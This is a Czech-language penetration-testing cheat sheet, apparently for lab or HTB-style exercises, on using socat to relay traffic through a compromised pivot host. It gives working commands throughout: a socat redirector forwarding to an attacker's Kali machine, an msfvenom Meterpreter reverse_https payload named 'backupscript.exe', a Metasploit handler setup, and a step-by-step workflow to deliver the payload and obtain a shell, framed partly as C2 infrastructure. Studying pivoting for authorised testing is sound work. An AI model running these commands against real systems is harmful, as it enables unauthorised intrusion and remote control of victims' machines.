# SOCAT Reverse Shell / Traffic Redirector

## Účel

**Socat** je nástroj pro přesměrování TCP spojení. V pentestu se používá hlavně při:

- pivotingu přes kompromitovaný host
- získání reverse shellu z izolované sítě
- vytvoření jednoduchého redirectoru
- zpřístupnění interních služeb

Typický scénář:

```
Kali (Attacker)
10.10.14.18
      |
      |
      v
Pivot Host (Ubuntu)
172.16.5.129
      |
      |
      v
Windows Target
172.16.5.19
```

Windows nevidí Kali přímo → spojení jde přes Pivot Host.

---

# 1. Reverse Shell Redirect přes Socat

## Scénář

Máme:

- kompromitovaný Ubuntu server jako pivot
- Windows stroj ve vnitřní síti
- chceme dostat shell zpět na Kali

Socat funguje jako **TCP proxy**:

```
Windows
   |
   | reverse shell
   |
   v
Ubuntu:8080
   |
   | socat forward
   |
   v
Kali:80
```

---

# 2. Spuštění Socatu na Pivot Hostu

Na Ubuntu:

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Parametry:

|Parametr|Význam|
|---|---|
|TCP4-LISTEN|otevře TCP listener|
|8080|port na pivot hostu|
|fork|vytvoří nový proces pro každé spojení|
|TCP4|cílové spojení|
|10.10.14.18:80|Kali listener|

Kontrola:

```
ss -tlnp
```

Výsledek:

```
LISTEN 172.16.5.129:8080
```

---

# 3. Vytvoření Payloadu

Payload musí mířit na pivot host, ne na Kali.

```
msfvenom -p windows/x64/meterpreter/reverse_https \
LHOST=172.16.5.129 \
LPORT=8080 \
-f exe \
-o backupscript.exe
```

Důležité:

Špatně:

```
LHOST=10.10.14.18
```

Windows by se snažil připojit přímo na Kali.

Správně:

```
LHOST=172.16.5.129
```

---

# 4. Listener na Kali

Metasploit:

```
use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_https

set LHOST 0.0.0.0

set LPORT 80

run
```

Tok:

```
Windows:8080
        |
        |
     Socat
        |
        |
Kali:80
```

---

# 5. Přístup k interní službě přes Socat

Socat není pouze pro reverse shelly.

Může fungovat jako jednoduchý port forward.

Například:

Interní web:

```
172.16.5.19:80
```

Ubuntu:

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:80
```

Přístup:

```
http://pivot-host:8080
```

Výsledek:

```
Pivot:8080
      |
      |
      v
172.16.5.19:80
```

---

# 6. Socat vs SSH vs Meterpreter Portfwd

|Vlastnost|Socat|SSH Forward|Meterpreter portfwd|
|---|---|---|---|
|Nutný shell|Ano|SSH účet|Meterpreter session|
|Stabilita|Vysoká|Vysoká|Závislá na MSF|
|OPSEC|Nízká detekce|Nízká|Vyšší riziko|
|Použití|Redirector|Tunely|HTB / post-exploitation|
|Proxychains|Ne|Ne|Ano|

---

# 7. Troubleshooting

## Socat neposlouchá

Kontrola:

```
ss -tlnp | grep 8080
```

---

## Firewall blokuje port

Ubuntu:

```
sudo ufw status
```

Otevření:

```
sudo ufw allow 8080
```

---

## Shell nepřichází

Kontrolní body:

### 1. Windows vidí pivot?

```
Test-NetConnection 172.16.5.129 -Port 8080
```

---

### 2. Socat běží?

```
ps aux | grep socat
```

---

### 3. Kali listener běží?

```
ss -tlnp | grep 80
```

---

# Pentester Workflow

```
1.
Získej shell na pivot hostu

↓

2.
Zjisti interní síť

ip route
ifconfig

↓

3.
Spusť redirector

socat TCP4-LISTEN:8080,fork TCP4:KALI_IP:80

↓

4.
Vytvoř payload na pivot IP

msfvenom

↓

5.
Doruč payload na Windows

↓

6.
Spusť handler

↓

7.
Získej nový shell
```

---

# Kdy použít Socat

Použij, když:

✅ máš jednoduchý TCP forwarding  
✅ nechceš držet SSH tunel  
✅ nechceš záviset na Meterpreter session  
✅ potřebuješ stabilní redirector  
✅ děláš C2 infrastrukturu

Nepoužívej, když:

❌ potřebuješ skenovat celou síť → použij SOCKS/proxychains  
❌ potřebuješ dynamické routování → použij Ligolo-ng  
❌ potřebuješ správu více pivotů → použij Metasploit routing/Ligolo-ng